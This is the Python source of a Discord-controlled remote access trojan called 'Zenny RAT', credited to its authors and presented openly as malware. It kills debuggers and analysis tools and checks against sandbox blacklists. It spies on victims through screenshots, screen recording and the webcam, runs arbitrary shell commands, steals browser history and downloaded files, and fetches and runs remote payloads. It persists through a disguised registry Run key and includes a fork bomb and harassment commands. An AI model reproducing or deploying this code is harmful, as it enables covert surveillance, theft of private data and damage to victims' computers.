# synthetic#2368
# dm me for updates on project
# https://t.me/syntheticlol
import os
import cv2
import discord
import asyncio
import ctypes
import psutil
import requests
import datetime
import platform
import numpy as np
import subprocess
import webbrowser
import pyautogui
import socket,threading
import time as t
import pygame
import winreg
import sys
import browser_cookie3
import zipfile
import shutil
from PIL import ImageGrab
from io import BytesIO
from discord import File
from discord.ext import commands
from browser_history import get_history



kernel32 = ctypes.WinDLL('kernel32')
is_debugger_detected = kernel32.IsDebuggerPresent()

if is_debugger_detected:
    exit()
else:
    pass

process_handle = kernel32.GetCurrentProcess()

is_debugger_detected2 = ctypes.c_int(0)
kernel32.CheckRemoteDebuggerPresent(process_handle, ctypes.byref(is_debugger_detected2))

if is_debugger_detected2:
    exit()
else:
    pass

class Debug:
    def __init__(self):
        if self.checks():
            self.self_destruct()

    def checks(self):
        debugging = False

        self.blackListedUsers = [
            'WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A',
            'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise',
            'User01', 'test', 'RGzcBUyrznReg']
        self.blackListedPCNames = [
            'BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1',
            'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ',
            'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M',
            'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P',
            'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
        self.blackListedHWIDS = [
            '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555',
            '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A',
            '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121',
            '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7',
            '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE',
            'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3',
            'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF',
            '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0',
            '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4',
            'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8',
            '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250',
            '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E',
            '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3',
            'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026',
            'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85',
            'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D',
            'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518',
            '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009',
            'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9',
            '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE',
            '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972',
            '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE',
            'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173',
            'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C',
            'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57',
            '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2',
            'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5',
            '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F',
            'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00',
            '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57',
            'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08',
            'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661',
            '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
        self.blackListedIPS = [
            '88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116',
            '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151',
            '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50',
            '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143',
            '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97',
            '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167',
            '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
        self.blackListedMacs = [
            '00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de',
            '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40',
            '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01',
            '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3',
            '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1',
            '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de',
            'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02',
            '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3',
            '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77',
            '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d',
            '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e',
            '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8',
            '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20',
            '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7',
            '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de',
            '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33',
            '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06',
            '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d',
            '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
        self.blacklistedProcesses = [
            "httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64",
            "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga",
            "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver", 'ilspy', 'dnspy', 'smsniff']

        self.check_process()
        if self.get_network():
            debugging = True
        if self.get_system():
            debugging = True
        return debugging

    def check_process(self) -> None:
        detected = False
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                try:
                    proc.kill()
                    print(f"Detected blacklisted process: {proc.name()}")
                    detected = True
                    exit()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        if sys.gettrace():
            print("Debugging is active.")
            exit()
        if detected:
            print("Detected blacklisted processes.")
            exit()
        else:
          pass

    def get_network(self) -> bool:
        ip = requests.get('https://api.ipify.org').text
        interface, addrs = next(iter(psutil.net_if_addrs().items()))
        mac = addrs[0].address

        if ip in self.blackListedIPS:
            print(f"Detected blacklisted IP: {ip}")
            exit()
            return True
        if mac in self.blackListedMacs:
            print(f"Detected blacklisted MAC address: {mac}")
            exit()
            return True
        return False

    def get_system(self) -> bool:
        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()

        if hwid in self.blackListedHWIDS:
            print(f"Detected blacklisted HWID: {hwid}")
            exit()
            return True
        if username in self.blackListedUsers:
            print(f"Detected blacklisted username: {username}")
            exit()
            return True
        if hostname in self.blackListedPCNames:
            print(f"Detected blacklisted hostname: {hostname}")
            exit()
            return True
        return False

    def self_destruct(self) -> None:
        sys.exit(0)

    def detect_blacklisted_items(self):
        self.check_process()
        network_detected = self.get_network()
        system_detected = self.get_system()
        self.debugging = network_detected or system_detected

    def check_virtual_machine(self) -> None:
        powershell_command = "powershell -Command \"Get-WmiObject Win32_PortConnector\""
        output = subprocess.check_output(powershell_command, shell=True, text=True)

        if "Port Connector" in output:
            pass
        else:
            print("please report this to owner.")
            exit()

        self.check_thread = threading.Thread(target=self.continuous_check)
        self.check_thread.daemon = True
        self.check_thread.start()

        if self.get_network() or self.get_system():
            self.self_destruct()

    def continuous_check(self):
        while True:
            self.check_process()
            t.sleep(60)



detector = Debug()
detector.detect_blacklisted_items()
detector.check_virtual_machine() 


if detector.debugging:
    print("fatherless, dont use debugger")
else:
    print(".")






intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents, help_command=None)

config = {
    'token': "bot token",
    'server_id': 'your server id'
}
webhook_url= 'replace i forgot if used in code but replace'
session_channel = "random"
sessions = {}



@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Please provide the required arguments for the command.")
    elif isinstance(error, commands.BadArgument):
        await ctx.send("Invalid argument. Please check your input.")
    else:
        print(f"An error occurred: {error}")

@bot.event
async def errorerror(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("Command doesn't exist :skull:")
        

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    await bot.change_presence(activity=discord.Game(name="Rewritten Zenny RAT Version 0.2 | made by synthetic#3681"))

    server = bot.get_guild(int(config['server_id']))
    if server:
        category = discord.utils.get(server.categories, name='Sessions')
        if not category:
            category = await server.create_category_channel('Sessions')

        pcn = socket.gethostname().lower()

        session = discord.utils.get(category.channels, name=pcn)
        if session:
            sessions[pcn] = session
            print(f"Reconnected to session '{pcn}' in {category.name}'.")
        else:
            session = await category.create_text_channel(pcn)
            sessions[pcn] = session
            print(f"New session '{pcn}' created in {category.name}'.")

        embed = discord.Embed(
            title="Zenny Rat Connected" if session else "Zenny Rat Reconnected",
            description=f"Your Session Key is {pcn} :white_check_mark:",
            color=discord.Color.green()
        )
        await session.send(embed=embed) if session else None
    else:
        print("Server not found.")



@bot.command()
async def help(ctx):
    message = """```
Remote Desktop:

  .screenshot <sessionkey>: Takes a screenshot of the user's PC
  .record <sessionkey>: Records the user's screen for 30 seconds
  .webcam <sessionkey>: Captures a picture from the user's webcam

------------------------------------------------------------------------------------------

Information Gathering:

  .time <sessionkey>: Retrieves the user's date and time
  .Ipinfo <sessionkey>: Retrieves the user's IP information
  .sysinfo <sessionkey>: Retrieves the user's system information
  .usage <sessionkey>: Tells you the users disk and cpu usage

------------------------------------------------------------------------------------------

Remote Shell Commands:

  .shell <session> <command>: Executes a command on the victim's computer

------------------------------------------------------------------------------------------

File Management:

  .website <sessionkey> <https://example.com>: Sends the user to a website of choice
  .getdownloads <sessionkey>: Gets all Users files in downloads folder
  .download <sessionkey>: Can download any file in their downloads folder

------------------------------------------------------------------------------------------

System Control:

  .restart <sessionkey>: Restarts the user's computer
  .shutdown <sessionkey>: Shuts down the user's computer

------------------------------------------------------------------------------------------

Malware Commands

  .upload <session> <filelink>: Uploads and downloads file and then runs it on victims pc
  .startup <session>: puts rat on startup
  .history <session>:
  .roblox <session>:
  .exodus <session>:
  .ddos <website>: COMING SOON
  .spread <session>

------------------------------------------------------------------------------------------
```
"""
    message2 = """```
Troll Commands:
  
  .furryporn <session>: this spams furry porn browsers on victims browser to flood their history
  .fork <session>: forkbombs their computer using simple batch script
  .rickroll <session>: rickrolls their computer for 30 seconds and they cannot escape
  .music <session> <file_attachment>: plays music on their computer
  .bluescreen <session>: COMING SOON.

------------------------------------------------------------------------------------------
```
"""

    await ctx.send(message)
    await ctx.send(message2)


@bot.command()
async def screenshot(ctx, seshn: str):
    session = sessions.get(seshn)
    if session:
        screenshot = pyautogui.screenshot()
        screenshot.save(f'{seshn}.png')
        await ctx.send(f"Screenshot", file=discord.File(f'{seshn}.png'))
    else:
        pass

@bot.command()
async def time(ctx, seshn: str):
    session = sessions.get(seshn)
    if session:
        ctime = datetime.datetime.now().strftime("%H:%M:%S")
        cdate = datetime.date.today().strftime("%Y-%m-%d")
        await ctx.send(f"The users current time > {ctime}")
        await ctx.send(f"The users current date > {cdate}")
    else:
        pass

@bot.command()
async def ipinfo(ctx, seshn: str):
    session = sessions.get(seshn)
    if session:
        url = "http://ipinfo.io/json"
        response = requests.get(url)
        data = response.json()

        embed = discord.Embed(title="Xen Rat - IP LOG", description="IP INFO", color=discord.Color.purple())
        embed.add_field(name=":globe_with_meridians: IP", value=f"```{data['ip']}```", inline=False)
        embed.add_field(name=":house: City", value=f"```{data['city']}```", inline=True)
        embed.add_field(name=":map: Region", value=f"```{data['region']}```", inline=True)
        embed.add_field(name=":earth_americas: Country", value=f"```{data['country']}```", inline=True)
        embed.add_field(name=":briefcase: Organization", value=f"```{data['org']}```", inline=False)

        await ctx.send(embed=embed)
    else:
        pass

@bot.command()
async def sysinfo(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        si = platform.uname()

        embed = discord.Embed(title="System Information", color=discord.Color.purple())
        embed.add_field(name="System", value=f"```{si.system}```", inline=False)
        embed.add_field(name="Node Name", value=f"```{si.node}```", inline=True)
        embed.add_field(name="Release", value=f"```{si.release}```", inline=True)
        embed.add_field(name="Version", value=f"```{si.version}```", inline=True)
        embed.add_field(name="Machine", value=f"```{si.machine}```", inline=True)
        embed.add_field(name="Processor", value=f"```{si.processor}```", inline=True)

        await session.send(embed=embed)
    else:
        pass

@bot.command()
async def record(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        await ctx.send("Recording started")

        start = datetime.datetime.now()
        duration = datetime.timedelta(seconds=30)
        frames = []

        while datetime.datetime.now() - start < duration:
            img = ImageGrab.grab()
            frames.append(cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR))

            await asyncio.sleep(0.1)

        height, width, _ = frames[0].shape
        outputf = "screen.mp4"
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        videow = cv2.VideoWriter(outputf, fourcc, 10, (width, height))

        for frame in frames:
            videow.write(frame)
        videow.release()

        await ctx.send("Recording completed")
        await ctx.send(file=discord.File(outputf))
        os.remove(outputf)
    else:
        pass

@bot.command()
async def errorbox(ctx, seshn: str, *, message: str):
    session = sessions.get(seshn.lower())
    if session:
        await ctx.send("Sent Errorbox whoopty Doo!")
        ctypes.windll.user32.MessageBoxW(None, message, "Error", 0)
        await ctx.send("They saw the error message.")
    else:
        pass

@bot.command()
async def website(ctx, seshn: str, websiteu: str):
    session = sessions.get(seshn.lower())
    if session:
        try:
            webbrowser.open(websiteu)

            await ctx.send(f"opened Website")
        except webbrowser.Error:
            await ctx.send("Failed")
    else:
        pass

@bot.command()
async def shutdown(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        try:
            os.system("shutdown /s /t 0")

            await ctx.send(f"Computer Shutdown")
        except os.OSError:
            await ctx.send("Failed")
    else:
        pass

@bot.command()
async def restart(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        try:
            os.system("shutdown /r /t 0")

            await ctx.send(f"Computer Restarted")
        except os.OSError:
            await ctx.send("Failed")
    else:
        pass


@bot.command()
async def webcam(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            await ctx.send("Failed")
            return

        ret, frame = cap.read()

        if not ret:
            await ctx.send("Failed.")
            return
        output = "webcam.jpg"
        cv2.imwrite(output, frame)
        await session.send("", file=discord.File(output))
        os.remove(output)
        cap.release()
    else:
        pass

@bot.command()
async def shell(ctx, seshn: str, *, command: str):
    session = sessions.get(seshn.lower())
    if session:
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            with open("output.txt", "w") as file:
                file.write(output)
            await session.send(file=discord.File("output.txt"))
            os.remove("output.txt")
        except subprocess.CalledProcessError as e:
            pass
    else:
        pass

@bot.command()
async def usage(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        disku = psutil.disk_usage("/")
        totaldick = round(disku.total / (1024 ** 3), 2)
        useddick = round(disku.used / (1024 ** 3), 2)
        dickperc = disku.percent

        cpuperc = psutil.cpu_percent()

        embed = discord.Embed(title="System Usage", color=discord.Color.purple())
        embed.add_field(name="Session", value=seshn, inline=False)
        embed.add_field(name="Disk", value=f"```{useddick} GB / {totaldick} GB ({dickperc}%)```", inline=False)
        embed.add_field(name="CPU", value=f"```{cpuperc}%```", inline=False)

        await session.send(embed=embed)
    else:
        pass

@bot.command()
async def upload(ctx, seshn: str, filel: str):
    session = sessions.get(seshn.lower())
    if session:
        if not filel.startswith("https://cdn.discordapp.com/attachments/"):
            await ctx.send("Invalid link. It must be a Discord attachment download link.")
            return
        
        try:
            response = requests.get(filel)
            if response.status_code == 200:
                filen = filel.split("/")[-1]
                filep = f"./{filen}"
                with open(filep, "wb") as file:
                    file.write(response.content)

                try:
                    subprocess.Popen(["start", filep], shell=True)
                except subprocess.SubprocessError:
                    await ctx.send("Failed to run the file.")
                else:
                    await ctx.send("File has been run.")
            else:
                await ctx.send("Failed to download the file.")
        except requests.exceptions.RequestException:
            await ctx.send("Error occurred during download.")
    else:
        pass

@bot.command()
async def getdownloads(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        downloadf = os.path.expanduser("~\\Downloads")
        files = os.listdir(downloadf)
        if not files:
            await session.send("No files found")
            return

        filel = "\n".join(files)
        with open("CdriveDownload.txt", "w", encoding="utf-8") as file:
            file.write(filel)

        await session.send("", file=discord.File("CdriveDownload.txt"))
        os.remove("CdriveDownload.txt")
    else:
        pass

@bot.command()
async def download(ctx, seshn: str, filename: str):
    session = sessions.get(seshn.lower())
    if session:
        download = os.path.expanduser("~\\Downloads")
        file = os.path.join(download, filename)
        if os.path.isfile(file):
            await session.send(f"Downloaded..", file=discord.File(file))
        else:
            pass
    else:
        pass

@bot.command()
async def music(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        if len(ctx.message.attachments) == 0:
            await ctx.send("Invalid file Please send an MP3 file in the message not a link or anything")
            return

        attachment = ctx.message.attachments[0]
        if not attachment.filename.endswith('.mp3'):
            await ctx.send("Invalid file extension")
            return

        download = os.path.join(os.getcwd(), attachment.filename)
        await attachment.save(download)
        pygame.mixer.init()
        try:
            pygame.mixer.music.load(download)
            await session_channel.send("Playing Music...")
            pygame.mixer.music.play()

            playb = asyncio.create_task(con(pygame.mixer.music))

            while not playb.done():
                await bot.process_commands(ctx.message)
        finally:
            pygame.mixer.music.stop()
            pygame.mixer.quit()
            os.remove(download)

        await session_channel.send("Finished playing the music.")
    else:
        pass

async def con(music_player):
    while music_player.get_busy():
        await asyncio.sleep(1)
    music_player.stop()

@bot.command()
async def furryporn(ctx, seshn: str):
    session = sessions.get(seshn.lower())
    if session:
        website = "https://www.pornhub.com/view_video.php?viewkey=63d567c6732bd"
        windows = 100
        for _ in range(windows):
            webbrowser.open(website)
        await session_channel.send("Opening furryporn...")
    else:
        pass

@bot.command()
async def rickroll(ctx, seshn):
    session = sessions.get(seshn.lower())
    if session:
     temp_dir = os.path.join(os.environ['TEMP'], 'rickroll')

    os.makedirs(temp_dir, exist_ok=True)

    video_path = os.path.join(temp_dir, 'rickroll.mp4')
    
    if not os.path.isfile(video_path):
        videou = "https://cdn.discordapp.com/attachments/1156252858455433256/1160964029020373153/rickroll.mp4"
        response = requests.get(videou)
        with open(video_path, 'wb') as file:
            file.write(response.content)

    videop = subprocess.Popen(['start', video_path], shell=True)
    await ctx.send("Rickrolled victim :)")
    await asyncio.sleep(30)
    videop.terminate()

# added by codepulze

@bot.command()
async def history(ctx, seshn):
    session = sessions.get(seshn.lower())
    if session:
      outputs = get_history()
    his = outputs.histories

    temp_dir = os.path.join(os.environ['TEMP'], 'thighlover123washere')

    os.makedirs(temp_dir, exist_ok=True)

    history_path = os.path.join(temp_dir, 'his.txt')

    with open(history_path, 'w') as file:
        for entry in his:
            file.write(f"{entry[0]} - {entry[1]}\n")

    await ctx.send(file=discord.File(history_path))
    os.remove(history_path)

# added by codepulze

@bot.command()
async def tasklist(ctx, seshn):
    session = sessions.get(seshn.lower())
    if session:
        try:
            output = subprocess.check_output("tasklist", shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            with open("tasklist.txt", "w") as file:
                file.write(output)

            await ctx.send("Task List:", file=discord.File("tasklist.txt"))
        except subprocess.CalledProcessError as e:
            embed = discord.Embed(title="Error", description=f"An error occurred: {e.output}", color=discord.Color.red())
            await ctx.send(embed=embed)
        finally:
            if os.path.exists("tasklist.txt"):
                os.remove("tasklist.txt")

@bot.command()
async def fork(ctx, seshn):
    session = sessions.get(seshn.lower())
    if session:
        command = "%0|%0"
        os.system(command)
        await ctx.send(f"Forkbombed session :rofl:")
    else:
        pass
    
@bot.command()
async def startup(ctx, seshn):
    session = sessions.get(seshn.lower())
    if session:
        exe = 'Bootstrapper.exe'
        key = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
        directory = os.path.join(os.path.expanduser('~'), 'Documents', 'Resources')
        path = os.path.join(directory, exe)
        os.makedirs(directory, exist_ok=True)
        script_path = sys.argv[0]
        shutil.copy(script_path, path)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, 'Windows', 0, winreg.REG_SZ, path)

        await ctx.send(f'Put Zenny on startup :smiling_imp:')
    else:
        pass

def get_roblox_cookie():
    cookies = {}
